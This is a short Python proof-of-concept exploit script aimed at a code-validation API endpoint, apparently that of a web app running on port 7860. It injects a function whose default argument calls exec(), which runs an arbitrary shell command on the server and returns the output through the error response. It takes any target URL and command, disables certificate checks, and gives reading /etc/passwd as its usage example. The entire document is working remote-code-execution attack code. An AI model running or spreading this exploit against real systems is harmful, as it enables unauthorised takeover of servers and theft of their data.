#!/usr/bin/env python3

import sys
import json
import requests

requests.packages.urllib3.disable_warnings()

def exploit(target, cmd):
    url = f"{target.rstrip('/')}/api/v1/validate/code"
    payload = {
        "code": f'def poc(cd=exec(\'raise Exception(__import__("subprocess").check_output("{cmd}", shell=True))\')):\n    pass'
    }

    try:
        response = requests.post(
            url,
            headers={"Content-Type": "application/json"},
            data=json.dumps(payload),
            verify=False,
            timeout=30
        )
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return None

    if response.status_code != 200:
        print(f"[!] Server responded with status {response.status_code}")
        return None

    try:
        data = response.json()
        errors = data.get("function", {}).get("errors", [])
        if errors:
            err_msg = errors[0]
            if isinstance(err_msg, str) and err_msg.startswith("b'"):
                return err_msg[2:-1].encode().decode("unicode_escape").strip()
            return err_msg
    except Exception as e:
        print(f"[!] Failed to parse JSON: {e}")
        return None

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [command]")
        print(f"Example: {sys.argv[0]} http://localhost:7860 'cat /etc/passwd'")
        sys.exit(1)

    target_url = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "id"

    print(f"[*] Target: {target_url}")
    print(f"[*] Command: {command}")
    print(f"[*] Sending exploit...")

    output = exploit(target_url, command)

    if output:
        print(f"[+] SUCCESS - Command executed!")
        print(f"[+] Output:\n{output}")
        return 0
    else:
        print("[-] FAILED - Exploit did not work")
        return 1

if __name__ == "__main__":
    sys.exit(main())
